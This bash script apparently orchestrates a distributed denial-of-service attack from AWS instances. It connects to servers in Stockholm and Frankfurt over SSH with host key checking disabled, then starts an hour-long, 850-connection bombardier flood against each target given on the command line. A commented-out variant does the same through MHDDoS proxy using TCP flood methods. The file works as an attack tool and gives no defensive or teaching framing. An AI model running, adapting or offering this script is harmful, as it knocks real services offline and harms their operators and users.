#!/bin/bash

main(){
	echo "Fire via alpine/bombardier"
	./watchForInstancesStart.sh &&
	./watchForSSHStart.sh || exit 1

	fireFromStockholm ${@} &
	fireFromFrankfurt ${@}
	wait
}

fireFromStockholm(){
	local STOCKHOLM_INSTANCES_IPS=`./getInstancesIPs.sh -s`

	for ip in ${STOCKHOLM_INSTANCES_IPS}
	do
		fireViaBombardier "key-stockholm-0.pem" ${ip} ${@} &
	done
}

fireFromFrankfurt(){
	local FRANKFURT_INSTANCES_IPS=`./getInstancesIPs.sh -f`

	for ip in ${FRANKFURT_INSTANCES_IPS}
	do
		fireViaBombardier "key-frankfurt-0.pem" ${ip} ${@} &
	done
}

fireViaBombardier(){
	local KEY=${1}
	local IP=${2}
	shift 2

	for target in ${@}
	do
		echo "    from ${IP} on ${target}"
		ssh \
			-i ${KEY} \
			-o "LogLevel ERROR" \
			-o "IdentitiesOnly yes" \
			-o "StrictHostKeyChecking no" \
			-o "UserKnownHostsFile /dev/null" \
			"ubuntu@${IP}" \
				screen -dm \
					sudo docker run \
						-it \
						--rm alpine/bombardier \
						-c 850 \
						-d 3600s \
						-l ${target}
	done
}

# https://hub.docker.com/r/portholeascend/mhddos_proxy
# https://github.com/MHProDev/MHDDoS
# fireViaMHDDoS(){
#	local KEY=${1}
#	local IP=${2}
#	shift 2
#
#	echo "    fires via portholeascend/mhddos_proxy from ${IP}"
#
#	# Check whether -c is passed as a list with targets
#	for p in ${@}
#	do
#		[[ ${p} == "-c" ]] &&
#		shift &&
#		CONFIG_URL=${1} &&
#		break
#	done
#
#	[[ -z ${CONFIG_URL} ]] &&
#	ssh \
#		-i ${KEY} \
#		-o "LogLevel ERROR" \
#		-o "IdentitiesOnly yes" \
#		-o "StrictHostKeyChecking no" \
#		-o "UserKnownHostsFile /dev/null" \
#		"ubuntu@${IP}" \
#			screen -dm \
#				sudo docker run \
#					-it \
#					--rm portholeascend/mhddos_proxy \
#					-t 1000 \
#					-p 300 \
#					--rpc 50 \
#					--http-methods TCP FLOOD \
#					--debug \
#					${@} ||
#	ssh \
#		-i ${KEY} \
#		-o "LogLevel ERROR" \
#		-o "IdentitiesOnly yes" \
#		-o "StrictHostKeyChecking no" \
#		-o "UserKnownHostsFile /dev/null" \
#		"ubuntu@${IP}" \
#			screen -dm \
#				sudo docker run \
#					-it \
#					--rm portholeascend/mhddos_proxy \
#					-t 1000 \
#					-p 300 \
#					--rpc 50 \
#					--http-methods TCP FLOOD \
#					--debug \
#					-c ${@}
# }

./checkAWS.sh && main ${@} || ./awsCliNa.sh


